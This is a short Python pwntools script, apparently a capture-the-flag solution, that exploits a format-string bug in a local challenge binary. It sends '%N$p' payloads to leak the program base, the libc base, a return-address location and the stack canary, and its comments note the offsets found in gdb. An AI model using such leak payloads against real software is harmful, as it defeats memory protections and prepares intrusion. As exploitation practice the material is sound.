from pwn import *
path = "./chall0"

script = """
    b *main+188
    c
    si
    """


def getleak(p, payload):
    p.recvuntil(b'exit): ')
    p.sendline(payload)
    leak = p.recvline().strip().decode()
    leak_pointer = "0x" + leak.split("x")[1]
    tmp = int(leak_pointer, 16)
    return tmp


def exploit():
    #p = process(path)
    p = gdb.debug(path, script)
    payload = b"AAAA%21$p"
    offset_prog = 0x135e
    hexleak = getleak(p, payload)
    print("base pointer calculated: ", hex(hexleak - offset_prog))
    #libc base from gdb = 0x770ee3400000
    #pointer most similar found at offset 19
    offset_libc = 0x29d90
    payload = b'AAAA%19$p'
    hexleak = getleak(p, payload)
    print("libc base pointer: ", hex(hexleak - offset_libc))
    # finding rip:
    #gdb rip of start in printf = 0x7ffd28403d38
    #pointer most similar in stack  output:  0x7ffd28403e48 at 23 offset
    offset_rip = 0x7ffd28403e48 - 0x7ffd28403d38
    payload = b'AAAA%23$p'
    hexleak = getleak(p, payload)
    print("hexleak: ", hex(hexleak), " offset: ", hex(offset_rip))
    print("rip at start of printf call: ", hex (hexleak - offset_rip))
    #finding the canary by seeing in gdb and comparing to stack
    #its literally right two arguments before the libc pointer
    payload = b'AAAA%17$p'
    hexleak = getleak(p, payload)
    print(hex(hexleak))
    #voila :)

exploit()


